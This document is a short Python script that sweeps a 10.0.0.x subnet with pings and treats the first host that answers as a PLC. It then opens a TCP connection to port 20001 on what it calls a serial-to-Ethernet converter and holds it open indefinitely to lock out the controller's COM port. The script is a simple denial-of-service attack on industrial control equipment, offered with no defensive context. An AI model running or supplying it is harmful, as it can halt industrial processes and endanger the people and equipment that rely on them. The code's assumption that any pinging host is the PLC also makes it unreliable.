import socket
import subprocess
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # Assuming the PLC is on the same network and responds to pings
    # This is a simple method to find the IP address of the PLC
    # You may need to adjust the subnet and range based on your network configuration
    subnet = "10.0.0."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        response = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if response.returncode == 0:
            print(f"PLC found at IP: {ip}")
            return ip
    print("PLC not found on the network.")
    return None

# Function to block the serial COM port
def block_com_port(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the serial to Ethernet converter
        sock.connect((ip, port))
        print(f"Connection to {ip}:{port} established. COM port is now blocked.")
        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Failed to block COM port: {e}")

# Main function
def main():
    # Find the IP address of the PLC
    plc_ip = find_plc_ip()
    if plc_ip:
        # Block the specified COM port (e.g., COM1 -> port 20001)
        block_com_port(plc_ip, 20001)

if __name__ == "__main__":
    main()